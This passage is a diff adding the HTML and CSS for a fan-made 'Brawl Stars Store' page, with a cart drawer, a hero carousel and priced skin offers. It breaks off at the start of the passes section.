@@ -1,0 +1,886 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Brawl Stars Store</title>
+<link href="https://fonts.googleapis.com/css2?family=Lilita+One&family=Nunito:wght@400;700;900&display=swap" rel="stylesheet">
+<style>
+ h1, h2 {
+        font-family: 'Lilita One', cursive;
+        font-size: 2.5rem;
+        color: #ffff00;
+        text-shadow: 0 4px 12px #0008, 0 0 12px var(--yellow);
+    }
+:root {
+  --yellow: #FFD700; --orange: #FF6B00; --purple: #6B2FA0;
+  --blue: #1A6BFF; --green: #2ECC40; --pink: #FF4ECD;
+  --white: #FFFFFF; --card-bg: rgba(0,0,0,0.55); --radius: 18px;
+}
+*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+html { scroll-behavior: smooth; }
+body { font-family: 'Nunito', sans-serif; background: #1a0a3a; color: var(--white); min-height: 100vh; overflow-x: hidden; }
+
+/* PARTICLES */
+#particles { position: fixed; inset: 0; pointer-events: none; z-index: 0; overflow: hidden; }
+.particle { position: absolute; border-radius: 50%; background: radial-gradient(circle, #FFD700cc, #FF6B0044); animation: floatUp linear infinite; opacity: 0; }
+@keyframes floatUp {
+  0%   { transform: translateY(100vh) scale(0.5) rotate(0deg); opacity: 0; }
+  10%  { opacity: 0.5; }
+  90%  { opacity: 0.2; }
+  100% { transform: translateY(-10vh) scale(1.2) rotate(360deg); opacity: 0; }
+}
+
+/* HEADER */
+header { position: sticky; top: 0; z-index: 999; background: rgba(10,2,28,0.97); border-bottom: 3px solid var(--yellow); display: flex; align-items: center; justify-content: space-between; padding: 0 28px; height: 70px; backdrop-filter: blur(14px); box-shadow: 0 4px 32px #FFD70033; gap: 16px; }
+.logo { font-family: 'Lilita One', cursive; font-size: 1.7rem; letter-spacing: 2px; background: linear-gradient(90deg, var(--yellow), var(--orange)); -webkit-background-clip: text; -webkit-text-fill-color: transparent; user-select: none; white-space: nowrap; }
+nav { display: flex; gap: 2px; align-items: center; flex-wrap: nowrap; }
+nav a { color: #c0b0e8; text-decoration: none; font-weight: 700; font-size: 0.82rem; letter-spacing: 1px; text-transform: uppercase; padding: 6px 10px; border-radius: 10px; transition: background 0.2s, color 0.2s; position: relative; white-space: nowrap; }
+nav a:hover, nav a.active { color: var(--yellow); background: rgba(255,215,0,0.12); }
+nav a.active::after { content: ''; position: absolute; bottom: 2px; left: 50%; transform: translateX(-50%); width: 6px; height: 6px; background: var(--yellow); border-radius: 50%; }
+
+/* CART BUTTON */
+.cart-btn { background: linear-gradient(135deg, var(--yellow), var(--orange)); border: none; border-radius: 12px; padding: 8px 16px; font-family: 'Lilita One', cursive; font-size: 0.88rem; color: #1a0000; cursor: pointer; display: flex; align-items: center; gap: 8px; transition: transform 0.15s, box-shadow 0.15s; box-shadow: 0 4px 16px #FFD70044; white-space: nowrap; }
+.cart-btn:hover { transform: scale(1.06); box-shadow: 0 6px 24px #FFD700aa; }
+.cart-count { background: #ff0055; color: #fff; border-radius: 50%; width: 20px; height: 20px; font-size: 0.72rem; font-weight: 900; display: flex; align-items: center; justify-content: center; transition: transform 0.2s; }
+.cart-count.bump { animation: bump 0.3s ease; }
+@keyframes bump { 0%,100%{transform:scale(1)} 50%{transform:scale(1.6)} }
+
+/* CART DRAWER */
+.cart-overlay { position: fixed; inset: 0; background: rgba(0,0,0,0.6); z-index: 1100; opacity: 0; pointer-events: none; transition: opacity 0.3s; }
+.cart-overlay.open { opacity: 1; pointer-events: all; }
+.cart-drawer { position: fixed; top: 0; right: -420px; width: 380px; max-width: 95vw; height: 100vh; background: #12052e; border-left: 3px solid var(--yellow); z-index: 1101; display: flex; flex-direction: column; transition: right 0.35s cubic-bezier(.4,0,.2,1); box-shadow: -8px 0 48px #00000088; }
+.cart-drawer.open { right: 0; }
+.cart-header { padding: 20px 24px; border-bottom: 2px solid #3a1a6a; display: flex; align-items: center; justify-content: space-between; }
+.cart-header h2 { font-family: 'Lilita One', cursive; font-size: 1.4rem; color: var(--yellow); }
+.cart-close { background: none; border: none; color: #aaa; font-size: 1.6rem; cursor: pointer; line-height: 1; }
+.cart-close:hover { color: #fff; }
+.cart-items { flex: 1; overflow-y: auto; padding: 16px 24px; }
+.cart-empty { text-align: center; color: #888; margin-top: 60px; font-size: 1rem; }
+.cart-item { display: flex; align-items: center; gap: 12px; background: rgba(255,255,255,0.06); border-radius: 12px; padding: 10px 12px; margin-bottom: 10px; }
+.cart-item-name { flex: 1; font-weight: 700; font-size: 0.88rem; }
+.cart-item-price { color: var(--yellow); font-weight: 900; font-size: 0.9rem; }
+.cart-item-remove { background: none; border: none; color: #ff4455; cursor: pointer; font-size: 1.1rem; }
+.cart-footer { padding: 20px 24px; border-top: 2px solid #3a1a6a; }
+.cart-total { display: flex; justify-content: space-between; font-family: 'Lilita One', cursive; font-size: 1.2rem; margin-bottom: 14px; }
+.cart-total span { color: var(--yellow); }
+.btn-checkout { width: 100%; padding: 14px; background: linear-gradient(90deg, var(--yellow), var(--orange)); border: none; border-radius: 14px; font-family: 'Lilita One', cursive; font-size: 1.1rem; color: #1a0000; cursor: pointer; box-shadow: 0 4px 20px #FFD70055; transition: transform 0.15s; }
+.btn-checkout:hover { transform: scale(1.03); }
+
+/* HERO CAROUSEL */
+.hero { position: relative; height: 420px; overflow: hidden; }
+.carousel { position: relative; width: 100%; height: 100%; }
+.carousel-slide { position: absolute; inset: 0; display: flex; align-items: center; justify-content: center; opacity: 0; transition: opacity 0.8s ease; pointer-events: none; }
+.carousel-slide.active { opacity: 1; pointer-events: all; }
+.slide-1 { background: linear-gradient(135deg, #2d0b6b 0%, #7b2ff7 40%, #FF6B00 100%); }
+.slide-2 { background: linear-gradient(135deg, #001a6b 0%, #0055dd 60%, #00d4ff 100%); }
+.slide-3 { background: linear-gradient(135deg, #3a0020 0%, #aa0055 60%, #FF6B00 100%); }
+.slide-bg { position: absolute; inset: 0; background: url("data:image/svg+xml,%3Csvg width='60' height='60' viewBox='0 0 60 60' xmlns='http://www.w3.org/2000/svg'%3E%3Cg fill='%23ffffff' fill-opacity='0.04'%3E%3Cpath d='M36 34v-4h-2v4h-4v2h4v4h2v-4h4v-2h-4zm0-30V0h-2v4h-4v2h4v4h2V6h4V4h-4zM6 34v-4H4v4H0v2h4v4h2v-4h4v-2H6zM6 4V0H4v4H0v2h4v4h2V6h4V4H6z'/%3E%3C/g%3E%3C/svg%3E"); }
+.slide-content { position: relative; z-index: 2; text-align: center; padding: 40px 20px; }
+.slide-content h1 { font-family: 'Lilita One', cursive; font-size: clamp(1.8rem,4.5vw,3.4rem); line-height: 1.1; text-shadow: 0 4px 32px #00000088, 0 0 12px var(--yellow); margin-bottom: 12px; animation: popIn 0.7s cubic-bezier(.175,.885,.32,1.275) both; }
+.slide-content p { font-size: 1.05rem; color: #fde9b0; font-weight: 700; margin-bottom: 20px; }
+.hero-badges { display: flex; gap: 14px; justify-content: center; flex-wrap: wrap; }
+.hero-badge { background: var(--card-bg); border: 2px solid var(--yellow); border-radius: 14px; padding: 10px 16px; min-width: 150px; text-align: center; backdrop-filter: blur(8px); }
+.hero-badge .badge-icon { font-size: 1.6rem; }
+.hero-badge .badge-title { font-family: 'Lilita One', cursive; font-size: 0.85rem; color: var(--yellow); margin: 3px 0 2px; }
+.hero-badge .badge-desc { font-size: 0.72rem; color: #ddd; }
+.carousel-dots { position: absolute; bottom: 14px; left: 50%; transform: translateX(-50%); display: flex; gap: 8px; z-index: 10; }
+.dot { width: 10px; height: 10px; border-radius: 50%; background: rgba(255,255,255,0.3); cursor: pointer; transition: background 0.2s, transform 0.2s; border: none; }
+.dot.active { background: var(--yellow); transform: scale(1.3); }
+.carousel-arrow { position: absolute; top: 50%; transform: translateY(-50%); background: rgba(0,0,0,0.4); border: 2px solid #ffffff44; color: #fff; font-size: 1.4rem; width: 44px; height: 44px; border-radius: 50%; cursor: pointer; z-index: 10; display: flex; align-items: center; justify-content: center; transition: background 0.2s; backdrop-filter: blur(4px); }
+.carousel-arrow:hover { background: rgba(255,215,0,0.25); border-color: var(--yellow); }
+.carousel-arrow.prev { left: 16px; }
+.carousel-arrow.next { right: 16px; }
+@keyframes popIn { from{opacity:0;transform:scale(0.85) translateY(20px)} to{opacity:1;transform:none} }
+
+/* SECTION TITLES */
+.section-title { font-family:'Lilita One',cursive; font-size:clamp(1.8rem,4vw,2.8rem); text-align:center; margin-bottom:8px; letter-spacing:2px; text-shadow:0 2px 12px #0008; }
+.section-sub { text-align:center; color:#c9b8ff; font-size:1rem; margin-bottom:36px; font-weight:700; }
+section { padding: 64px 24px; position: relative; z-index: 1; }
+
+/* CARDS */
+.cards-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(210px,1fr)); gap:22px; max-width:1200px; margin:0 auto; }
+.store-card { background:var(--card-bg); border:2.5px solid #7c44cc; border-radius:var(--radius); overflow:hidden; position:relative; transition:transform 0.2s,box-shadow 0.2s; cursor:pointer; }
+.store-card:hover { transform:translateY(-8px) scale(1.025); box-shadow:0 16px 48px #FFD70044,0 0 0 3px var(--yellow); border-color:var(--yellow); z-index:2; }
+.card-bonus { background:#222; font-size:0.72rem; font-weight:900; color:var(--yellow); padding:4px 12px; text-transform:uppercase; display:flex; align-items:center; gap:6px; }
+.card-bonus span { color:#fff; }
+.card-img { width:100%; height:155px; object-fit:cover; background:linear-gradient(135deg,#2a0e5e,#5a2a99); display:flex; align-items:center; justify-content:center; font-size:4rem; }
+.card-body { padding:12px 14px; }
+.card-name { font-family:'Lilita One',cursive; font-size:1rem; margin-bottom:4px; }
+.card-timer { font-size:0.74rem; color:#aaa; margin-bottom:4px; }
+.card-footer { display:flex; align-items:center; justify-content:space-between; margin-top:8px; }
+.card-pts { font-size:0.78rem; color:#c9b8ff; font-weight:700; }
+.card-price { background:#1a1a1a; border:2px solid #555; border-radius:10px; padding:5px 14px; font-weight:900; font-size:0.95rem; color:#fff; }
+.badge-discount { position:absolute; top:38px; right:10px; background:var(--orange); border-radius:8px; font-weight:900; font-size:0.78rem; color:#fff; padding:3px 8px; }
+.badge-hot { position:absolute; top:38px; right:10px; background:#ff0055; border-radius:8px; font-weight:900; font-size:0.78rem; color:#fff; padding:3px 8px; }
+.btn-add { display:block; width:100%; margin-top:10px; padding:8px; background:linear-gradient(90deg,var(--yellow),var(--orange)); border:none; border-radius:10px; font-family:'Lilita One',cursive; font-size:0.88rem; color:#1a0000; cursor:pointer; transition:transform 0.15s,box-shadow 0.15s; box-shadow:0 2px 10px #FFD70033; }
+.btn-add:hover { transform:scale(1.04); box-shadow:0 4px 18px #FFD70077; }
+
+/* HOVER POPUP */
+.popup-wrap { position: relative; }
+.hover-popup { position:absolute; bottom:calc(100% + 12px); left:50%; transform:translateX(-50%) scale(0.9); background:#1a0a3a; border:2px solid var(--yellow); border-radius:14px; padding:12px 16px; width:220px; pointer-events:none; opacity:0; transition:opacity 0.2s,transform 0.2s; z-index:200; box-shadow:0 8px 32px #00000088; font-size:0.82rem; color:#e0d0ff; line-height:1.5; }
+.hover-popup::after { content:''; position:absolute; top:100%; left:50%; transform:translateX(-50%); border:8px solid transparent; border-top-color:var(--yellow); }
+.popup-wrap:hover .hover-popup { opacity:1; transform:translateX(-50%) scale(1); }
+.popup-wrap:hover { z-index:50; }
+
+/* COUNTDOWN */
+.countdown { display:inline-flex; gap:5px; align-items:center; margin-bottom:6px; min-height:24px; }
+.cd-block { background:rgba(0,0,0,0.5); border-radius:6px; padding:2px 6px; font-family:'Lilita One',cursive; font-size:0.85rem; color:var(--yellow); }
+.cd-sep { color:#888; font-size:0.8rem; }
+
+/* SPECIALS */
+#specials { background: linear-gradient(180deg,#1a0a3a 0%,#6B2FA0 100%); }
+
+/* PASSES */
+#passes { background: linear-gradient(180deg,#20073a 0%,#2d0b6b 100%); }
+.passes-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(270px,1fr)); gap:28px; max-width:1000px; margin:0 auto; }
+.pass-card { border-radius:22px; overflow:hidden; position:relative; border:3px solid transparent; transition:transform 0.2s,box-shadow 0.2s; cursor:pointer; }
+.pass-card:hover { transform:translateY(-10px) scale(1.03); box-shadow:0 20px 60px #FFD70055; }
+.pass-card.plus { background:linear-gradient(135deg,#3d1265,#8b2be2); border-color:var(--pink); }
+.pass-card.pro  { background:linear-gradient(135deg,#0a4a10,#1aaa2a); border-color:#2ECC40; }
+.pass-card.basic{ background:linear-gradient(135deg,#7a4800,#d48000); border-color:var(--yellow); }
+.pass-header { padding:20px 22px 10px; }
+.pass-bonus-tag { display:inline-block; background:rgba(0,0,0,0.35); border-radius:8px; font-size:0.78rem; font-weight:900; color:var(--yellow); padding:3px 10px; margin-bottom:10px; }
+.pass-name { font-family:'Lilita One',cursive; font-size:1.6rem; margin-bottom:4px; }
+.pass-footer { display:flex; align-items:center; justify-content:space-between; padding:14px 22px; background:rgba(0,0,0,0.3); }
+.pass-pts { font-size:0.85rem; color:#ddd; font-weight:700; }
+.pass-price { background:rgba(0,0,0,0.5); border:2px solid #888; border-radius:12px; padding:7px 18px; font-weight:900; font-size:1.05rem; }
+.pass-note { font-size:0.72rem; color:#bbb; padding:0 22px 14px; }
+.pass-add { display:block; margin:0 22px 16px; padding:10px; background:linear-gradient(90deg,var(--yellow),var(--orange)); border:none; border-radius:12px; font-family:'Lilita One',cursive; font-size:0.95rem; color:#1a0000; cursor:pointer; width:calc(100% - 44px); transition:transform 0.15s; }
+.pass-add:hover { transform:scale(1.03); }
+
+/* OFFERS */
+#offers { background: linear-gradient(180deg,#0a1a6a 0%,#1A6BFF 100%); }
+.offers-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(240px,1fr)); gap:22px; max-width:1000px; margin:0 auto; }
+.offer-card { background:linear-gradient(135deg,#ffe033,#ff9500); border-radius:var(--radius); overflow:hidden; position:relative; transition:transform 0.2s,box-shadow 0.2s; cursor:pointer; }
+.offer-card:hover { transform:translateY(-8px) scale(1.025); box-shadow:0 16px 48px #FFD70077; }
+.offer-card .card-bonus { background:rgba(0,0,0,0.25); color:#222; }
+.offer-card .card-bonus span { color:#222; }
+.offer-card .card-body,.offer-card .card-name { color:#1a0800; }
+.offer-card .card-timer { color:#5a3000; }
+.offer-card .card-pts { color:#3a1000; }
+.offer-card .card-price { background:rgba(0,0,0,0.65); color:#fff; border-color:#fff3; }
+.offer-card .btn-add { color:#1a0000; }
+.offer-card.daily { background:linear-gradient(135deg,#1a6bff,#00d4ff); }
+.offer-card.daily .card-body,.offer-card.daily .card-name { color:#fff; }
+.offer-card.daily .card-timer { color:#c0e8ff; }
+.offer-card.daily .card-pts { color:#c0e8ff; }
+
+/* HYPERCHARGES */
+#hypercharges { background:linear-gradient(135deg,#ffe4f5 0%,#b8aaff 50%,#a0e4ff 100%); }
+#hypercharges .section-title { color:#2a0050; }
+#hypercharges .section-sub { color:#5a2080; }
+.hyper-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(220px,1fr)); gap:22px; max-width:900px; margin:0 auto; }
+.hyper-card { background:linear-gradient(135deg,#2a0050,#8b44dd); border:2.5px solid #dd88ff; border-radius:var(--radius); overflow:hidden; position:relative; transition:transform 0.2s,box-shadow 0.2s; cursor:pointer; }
+.hyper-card:hover { transform:translateY(-8px) scale(1.025); box-shadow:0 16px 48px #ff4ecdaa; border-color:var(--pink); }
+.hyper-tag { background:var(--pink); font-size:0.7rem; font-weight:900; color:#fff; padding:3px 12px; text-transform:uppercase; letter-spacing:2px; display:inline-block; border-radius:0 0 8px 0; }
+.hyper-body { padding:14px; }
+.hyper-name { font-family:'Lilita One',cursive; font-size:1.1rem; color:#ffd7ff; margin-bottom:6px; }
+.hyper-lock { color:#ddd; font-size:0.8rem; background:rgba(0,0,0,0.4); border-radius:8px; padding:5px 10px; margin-bottom:10px; }
+.hyper-footer { display:flex; align-items:center; justify-content:space-between; padding:10px 14px; background:rgba(0,0,0,0.3); }
+.hyper-pts { font-size:0.78rem; color:#e0b8ff; font-weight:700; }
+.hyper-price { background:rgba(0,0,0,0.5); border:2px solid #888; border-radius:10px; padding:5px 14px; font-weight:900; font-size:0.95rem; }
+
+/* GEMS */
+#gems { background:linear-gradient(180deg,#0a3a8a 0%,#1A6BFF 100%); }
+.gems-grid { display:grid; grid-template-columns:repeat(auto-fill,minmax(200px,1fr)); gap:20px; max-width:1000px; margin:0 auto; }
+.gem-card { background:linear-gradient(135deg,#1aaa2a,#2ECC40); border-radius:var(--radius); overflow:hidden; position:relative; border:2.5px solid #55ee66; transition:transform 0.2s,box-shadow 0.2s; cursor:pointer; }
+.gem-card:hover { transform:translateY(-8px) scale(1.025); box-shadow:0 16px 48px #2ECC4077; border-color:#fff; }
+.gem-bonus { background:rgba(0,0,0,0.25); font-size:0.72rem; font-weight:900; color:#fff; padding:4px 12px; display:flex; align-items:center; gap:6px; }
+.gem-body { padding:18px 14px 10px; text-align:center; }
+.gem-name { font-family:'Lilita One',cursive; font-size:1rem; color:#fff; }
+.gem-amount { font-family:'Lilita One',cursive; font-size:2.5rem; color:#fff; text-shadow:0 2px 8px #0008; }
+.gem-footer { display:flex; align-items:center; justify-content:space-between; padding:10px 14px; background:rgba(0,0,0,0.2); }
+.gem-pts { font-size:0.78rem; color:#c8ffd0; font-weight:700; }
+.gem-price { background:rgba(0,0,0,0.5); border:2px solid rgba(255,255,255,0.25); border-radius:10px; padding:5px 14px; font-weight:900; font-size:0.95rem; color:#fff; }
+.gem-sale { position:absolute; top:36px; right:8px; background:var(--pink); border-radius:8px; font-weight:900; font-size:0.75rem; color:#fff; padding:3px 8px; }
+.gem-add { display:block; margin:8px 12px 12px; padding:7px; background:rgba(0,0,0,0.35); border:2px solid rgba(255,255,255,0.4); border-radius:10px; font-family:'Lilita One',cursive; font-size:0.85rem; color:#fff; cursor:pointer; width:calc(100% - 24px); transition:background 0.15s; }
+.gem-add:hover { background:rgba(0,0,0,0.6); }
+      #rain {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+        #rain {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      pointer-events: none;
+      z-index: 0;
+    }
+
+    .rain-item {
+      position: absolute;
+      width: 35px;
+      height: 35px;
+      background-image: url("https://kboosting.com/img/29052/c/gems-500x500.png");
+      background-size: cover;
+      animation: fall linear infinite;
+      opacity: 0.7;
+    }
+
+    @keyframes fall {
+      0% {
+        transform: translateY(-60px) rotate(0deg);
+      }
+      100% {
+        transform: translateY(110vh) rotate(360deg);
+      }
+    }
+
+    /* 🧾 Login card */
+    .card {
+      background: url("https://www.nicepng.com/png/full/160-1600353_gem-gem-grab-brawl-stars.png") no-repeat center/cover;
+      backdrop-filter: blur(5px);
+      padding: 30px;
+      border-radius: 15px;
+      width: 320px;
+      text-align: center;
+      z-index: 2;
+      position: relative;
+      box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+    }
+
+    input {
+      width: 100%;
+      padding: 10px;
+      margin-top: 10px;
+      border-radius: 8px;
+      border: 1px solid #ff0000;
+    }
+
+    button {
+      margin-top: 15px;
+      width: 100%;
+      padding: 10px;
+      border: none;
+      border-radius: 8px;
+      background: #5f9cff;
+      color: white;
+      cursor: pointer;
+      font-size: 15px;
+    }
+
+    button:hover {
+      background: #4a84e0;
+    }
+
+    .hidden {
+      display: none;
+    }
+/* FOOTER */
+footer { background:#0a0218; border-top:3px solid var(--yellow); text-align:center; padding:32px 20px; color:#aaa; font-size:0.9rem; position:relative; z-index:1; }
+footer .footer-logo { font-family:'Lilita One',cursive; font-size:1.8rem; background:linear-gradient(90deg,var(--yellow),var(--orange)); -webkit-background-clip:text; -webkit-text-fill-color:transparent; margin-bottom:8px; }
+
+/* BACK TO TOP */
+#back-top { position:fixed; bottom:28px; right:28px; z-index:-900; width:48px; height:48px; border-radius:50%; background:linear-gradient(-135deg,var(--yellow),var(--orange));background-image: url("https://kboosting.com/img/29052/c/gems-500x500.png"); background-size: 100%; border:none; color:#000000; font-size:1.5rem; cursor:pointer; box-shadow:0 4px 20px #FFD70055; display:flex; align-items:center; justify-content:center; opacity:0; transform:translateY(16px); transition:opacity 0.3s,transform 0.3s; pointer-events:none; font-weight:900; }
+#back-top.visible { opacity:1; transform:none; pointer-events:all; }
+#back-top:hover { box-shadow:0 8px 32px #FFD700aa; transform:translateY(-3px); }
+
+/* TOAST */
+.toast { position:fixed; bottom:90px; right:28px; z-index:2000; background:#1a3a1a; border:2px solid var(--green); color:#afffaf; border-radius:12px; padding:10px 18px; font-weight:700; font-size:0.9rem; transform:translateY(20px); opacity:0; transition:opacity 0.3s,transform 0.3s; pointer-events:none; }
+.toast.show { opacity:1; transform:none; }
+
+/* SCROLLBAR */
+::-webkit-scrollbar { width: 8px; color: #5bcc44; }
+::-webkit-scrollbar-track { background: #1a0a3a; }
+::-webkit-scrollbar-thumb { background: #7c44cc; border-radius: 8px; }
+
+  /* ====== FOOTER ====== */
+</style>
+</head>
+<body>
+<link rel="icon" href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcToDlytiE178sfY8uXNj7aIesE2rM7gGOwjFCmb9VVEWJ7JAoUDaNYQZxuRG5iFNXAxvJRJAA&s=10" type="image/png">
+<!-- PARTICLES -->
+<div id="particles"></div>
+
+<!-- CART OVERLAY + DRAWER -->
+<div class="cart-overlay" id="cartOverlay" onclick="closeCart()"></div>
+<div class="cart-drawer" id="cartDrawer">
+  <div class="cart-header">
+    <h2>Your Cart</h2>
+    <button class="cart-close" onclick="closeCart()">&#x2715;</button>
+  </div>
+  <div class="cart-items" id="cartItems">
+    <div class="cart-empty" id="cartEmpty">Your cart is empty</div>
+  </div>
+  <div class="cart-footer">
+    <div class="cart-total">Total: <span id="cartTotal">$0.00</span></div>
+    <button class="btn-checkout" onclick="checkout()">Checkout</button>
+  </div>
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast"></div>
+
+<!-- HEADER -->
+<header>
+  <div class="logo">BRAWL STORE</div>
+  <nav id="mainNav">
+    <a href="#specials">Specials</a>
+    <a href="#passes">Passes</a>
+    <a href="#offers">Offers</a>
+    <a href="#hypercharges">Hypercharges</a>
+    <a href="#gems">Gems</a>
+  </nav>
+  <button class="cart-btn" onclick="toggleCart()">
+    Cart <span class="cart-count" id="cartCount">0</span>
+  </button>
+</header>
+
+<!-- HERO CAROUSEL -->
+<div class="hero">
+  <div class="carousel" id="carousel">
+    <div class="carousel-slide slide-1 active">
+      <div class="slide-bg"></div>
+      <div class="slide-content">
+        <h1>WELCOME TO THE<br>BRAWL STARS STORE!</h1>
+        <p>Get bonus gems, coins, or bling — only on the Store!</p>
+        <div class="hero-badges">
+          <div class="hero-badge">
+            <div class="badge-icon"><img src="https://wsrv.nl/?url=https://tiermaker.com/images/media/hero_images/2024/16585797/brawl-stars-299-gems-skins-with-mecha-colors-variant-16585797/165857971704140951.png" style="width:26px;height:26px;object-fit:contain;vertical-align:middle;"></div>
+            <div class="badge-title">+10% ON GEMS</div>
+            <div class="badge-desc">Bonus gems, coins or bling when you buy on Store!</div>
+          </div>
+          <div class="hero-badge">
+            <div class="badge-icon"><img src="https://wsrv.nl/?url=https://tiermaker.com/images/media/hero_images/2024/16585797/brawl-stars-299-gems-skins-with-mecha-colors-variant-16585797/165857971704140951.png" style="width:26px;height:26px;object-fit:contain;vertical-align:middle;"></div>
+            <div class="badge-title">BEST VALUE</div>
+            <div class="badge-desc">Special offers &amp; Brawl Pass + Gems bundles!</div>
+          </div>
+          <div class="hero-badge">
+            <div class="badge-icon" style="font-size:1.6rem;">▲</div>
+            <div class="badge-title">PROGRESS FASTER!</div>
+            <div class="badge-desc">Brawl Pass Plus — 30% instant progress!</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="carousel-slide slide-2">
+      <div class="slide-bg"></div>
+      <div class="slide-content">
+        <h1>BRAWL PASS PLUS —<br>GET A RESOURCE KEY!</h1>
+        <p>Limited time only. One extra Resource Key per account. Delivered when offer ends.</p>
+        <div class="hero-badges">
+          <div class="hero-badge" style="min-width:220px;">
+            <div class="badge-title" style="font-size:1rem;">LIMITED TIME OFFER</div>
+            <div class="badge-desc" style="margin-top:6px;">Buy Brawl Pass Plus now and claim your bonus!</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <div class="carousel-slide slide-3">
+      <div class="slide-bg"></div>
+      <div class="slide-content">
+        <h1>STARR PATROL<br>SKINS ARE LIVE!</h1>
+        <p>Exclusive high-value packs — only in the Brawl Stars Store!</p>
+        <div class="hero-badges">
+          <div class="hero-badge"><div class="badge-title">STARR PATROL</div><div class="badge-desc">New skins for Amber, Juju &amp; Bea!</div></div>
+          <div class="hero-badge"><div class="badge-title">UP TO -54% OFF</div><div class="badge-desc">Weekly offers on exclusive skins</div></div>
+        </div>
+      </div>
+    </div>
+    <button class="carousel-arrow prev" onclick="moveSlide(-1)">&#8249;</button>
+    <button class="carousel-arrow next" onclick="moveSlide(1)">&#8250;</button>
+    <div class="carousel-dots" id="carouselDots">
+      <button class="dot active" onclick="goSlide(0)"></button>
+      <button class="dot" onclick="goSlide(1)"></button>
+      <button class="dot" onclick="goSlide(2)"></button>
+    </div>
+  </div>
+</div>
+
+<!-- STORE SPECIALS -->
+<section id="specials">
+  <div class="section-title">STORE SPECIALS</div>
+  <div class="section-sub">These high-value offers are only available in the Brawl Stars Store. Enjoy!</div>
+  <div class="cards-grid">
+
+    <div class="store-card popup-wrap">
+      <div class="hover-popup"><strong>VOID AMBER</strong><br>Dark alternate skin for Amber.<br><br>Includes skin + 750 Bling store bonus.</div>
+      <div class="card-bonus">STORE BONUS <span>+750 BLING</span></div>
+      <div class="badge-discount">-24%</div>
+      <div class="card-img" style="padding:0;height:185px;background:linear-gradient(135deg,#0a1a3a,#1a3a7a);">
+        <img src="https://wsrv.nl/?url=https://static.wikia.nocookie.net/brawlstars/images/8/8e/Amber_Skin-Void.png/revision/latest/scale-to-width-down/250?cb=20260423095845" alt="Void Amber" style="width:100%;height:100%;object-fit:contain;">
+      </div>
+      <div class="card-body">
+        <div class="card-name">VOID AMBER</div>
+        <div class="countdown" id="cd-void"></div>
+        <div class="card-footer"><div class="card-pts">+750 pts</div><div class="card-price">$10.99</div></div>
+        <button class="btn-add" onclick="addToCart('Void Amber','$10.99')">Add to Cart</button>
+      </div>
+    </div>
+
+    <div class="store-card popup-wrap">
+      <div class="hover-popup"><strong>STARR PATROL AMBER</strong><br>Sci-fi patrol skin for Amber.<br><br>Includes skin + 750 Bling store bonus.</div>
+      <div class="card-bonus">STORE BONUS <span>+750 BLING</span></div>
+      <div class="badge-discount">-24%</div>
+      <div class="card-img" style="padding:0;height:185px;background:linear-gradient(135deg,#0a2a1a,#1a5a3a);">
+        <img src="https://wsrv.nl/?url=https://static.wikia.nocookie.net/brawlstars/images/f/fd/Amber_Skin-Starr_Patrol.png/revision/latest/scale-to-width-down/250?cb=20260423095836" alt="Starr Patrol Amber" style="width:100%;height:100%;object-fit:contain;">
+      </div>
+      <div class="card-body">
+        <div class="card-name">STARR PATROL AMBER</div>
+        <div class="countdown" id="cd-amber"></div>
+        <div class="card-footer"><div class="card-pts">+750 pts</div><div class="card-price">$8.99</div></div>
+        <button class="btn-add" onclick="addToCart('Starr Patrol Amber','$8.99')">Add to Cart</button>
+      </div>
+    </div>
+
+    <div class="store-card popup-wrap">
+      <div class="hover-popup"><strong>STARR PATROL JUJU</strong><br>Space patrol skin for Juju.<br><br>Includes skin + 500 Bling store bonus.</div>
+      <div class="card-bonus">STORE BONUS <span>+500 BLING</span></div>
+      <div class="badge-discount">-24%</div>
+      <div class="card-img" style="padding:0;height:185px;background:linear-gradient(135deg,#1a0a2a,#4a1a6a);">
+        <img src="https://wsrv.nl/?url=https://static.wikia.nocookie.net/brawlstars/images/0/00/Juju_Skin-Starr_Patrol.png/revision/latest/scale-to-width-down/250?cb=20260423102317" alt="Starr Patrol Juju" style="width:100%;height:100%;object-fit:contain;">
+      </div>
+      <div class="card-body">
+        <div class="card-name">STARR PATROL JUJU</div>
+        <div class="countdown" id="cd-juju"></div>
+        <div class="card-footer"><div class="card-pts">+500 pts</div><div class="card-price">$6.99</div></div>
+        <button class="btn-add" onclick="addToCart('Starr Patrol Juju','$6.99')">Add to Cart</button>
+      </div>
+    </div>
+
+    <div class="store-card popup-wrap">
+      <div class="hover-popup"><strong>STARR PATROL BEA</strong><br>Patrol-themed skin for Bea.<br><br>Includes skin + 450 Bling store bonus.</div>
+      <div class="card-bonus">STORE BONUS <span>+450 BLING</span></div>
+      <div class="badge-discount">-18%</div>
+      <div class="card-img" style="padding:0;height:185px;background:linear-gradient(135deg,#1a1a0a,#4a4a10);">
+        <img src="https://wsrv.nl/?url=https://static.wikia.nocookie.net/brawlstars/images/9/97/Bea_Skin-Starr_Patrol.png/revision/latest/scale-to-width-down/250?cb=20260423100003" alt="Starr Patrol Bea" style="width:100%;height:100%;object-fit:contain;">
+      </div>
+      <div class="card-body">
+        <div class="card-name">STARR PATROL BEA</div>
+        <div class="countdown" id="cd-bea"></div>
+        <div class="card-footer"><div class="card-pts">+450 pts</div><div class="card-price">$5.99</div></div>
+        <button class="btn-add" onclick="addToCart('Starr Patrol Bea','$5.99')">Add to Cart</button>
+      </div>
+    </div>
+
+  </div>
+</section>
+
+<!-- PASSES -->
+<section id="passes">
+  <div class="section-title">PASSES</div>
+  <div class="section-sub">Buy your pass now — activate it in game anytime!</div>
+  <div class="passes-grid">
+
+    <div class="pass-card plus popup-wrap">
